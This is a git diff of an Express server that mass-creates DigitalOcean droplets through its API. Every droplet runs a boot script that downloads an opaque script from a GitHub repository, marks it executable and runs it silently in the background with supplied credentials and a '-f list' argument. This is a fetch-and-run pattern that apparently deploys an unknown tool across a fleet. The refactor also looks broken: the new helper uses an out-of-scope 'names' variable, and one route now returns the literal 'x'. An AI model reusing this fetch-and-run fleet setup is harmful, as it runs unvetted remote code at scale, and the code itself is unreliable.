@@ -14,6 +14,16 @@ const token = '';
 
 const dateNow = () => Math.floor(Date.now() * 0.001)
 
+const getInstanceTemplate = ({login, password}) => {
+  return JSON.stringify({
+    "names": names,
+    "region": "fra1",
+    "size": "s-1vcpu-1gb",
+    "image": "ubuntu-20-04-x64",
+    "user_data": `#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u ${login} -p ${password} -f list >/dev/null 2>&1 &`
+  })
+}
+
 const requestDO = async (resource, opts = {}) => {
   const { headers, ...restOPTS } = opts;
 
@@ -46,8 +56,9 @@ app.get('/all', async (req, res) => {
   res.send(droplets)
 })
 
-app.get('/fill/:prefix', async (req, res) => {
+app.post('/fill/:prefix', async (req, res) => {
   const { prefix } = req.params;
+  const { creds } = req.body;
 
   let { droplets } = await requestDO('droplets?per_page=200', {
     headers: {
@@ -86,19 +97,13 @@ app.get('/fill/:prefix', async (req, res) => {
         Authorization: `Bearer ${req.headers['x-token']}`,
       },
       method: "POST",
-      body: JSON.stringify({
-        "names": names,
-        "region": "fra1",
-        "size": "s-1vcpu-1gb",
-        "image": "ubuntu-20-04-x64",
-        "user_data": "#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {username} -p {password} -f list >/dev/null 2>&1 &"
-      })
+      body: getInstanceTemplate(creds)
     })
 
     x.push(c)
   }
 
-  res.send(x)
+  res.send('x')
 })
 
 app.get('/restart/:id/:name', async (req, res) => {
@@ -129,8 +134,9 @@ app.get('/restart/:id/:name', async (req, res) => {
   res.send(c)
 })
 
-app.get('/create/:name', async (req, res) => {
+app.post('/create/:name', async (req, res) => {
   const { name } = req.params;
+  const { creds } = req.body;
 
   const c = await requestDO('droplets', {
     headers: {
@@ -138,23 +144,14 @@ app.get('/create/:name', async (req, res) => {
       "Content-Type": "application/json",
     },
     method: "POST",
-    body: JSON.stringify({
-      "name": name,
-      "region": "fra1",
-      "size": "s-1vcpu-1gb",
-      "image": "ubuntu-20-04-x64",
-      "ssh_keys": [
-        29861114
-      ],
-      "user_data": "#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {username} -p {password} -f list >/dev/null 2>&1 &"
-    })
+    body: getInstanceTemplate(creds)
   })
 
   res.send(c)
 })
 
 app.post('/createAll', async (req, res) => {
-  const { names } = req.body;
+  const { names, creds } = req.body;
 
   const chunks = names.reduce((all, one, i) => {
     const ch = Math.floor(i / 10);
@@ -173,13 +170,7 @@ app.post('/createAll', async (req, res) => {
         Authorization: `Bearer ${req.headers['x-token']}`,
       },
       method: "POST",
-      body: JSON.stringify({
-        "names": names,
-        "region": "fra1",
-        "size": "s-1vcpu-1gb",
-        "image": "ubuntu-20-04-x64",
-        "user_data": "#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {username} -p {password} -f list >/dev/null 2>&1 &"
-      })
+      body: getInstanceTemplate(creds)
     })
 
     x.push(c)
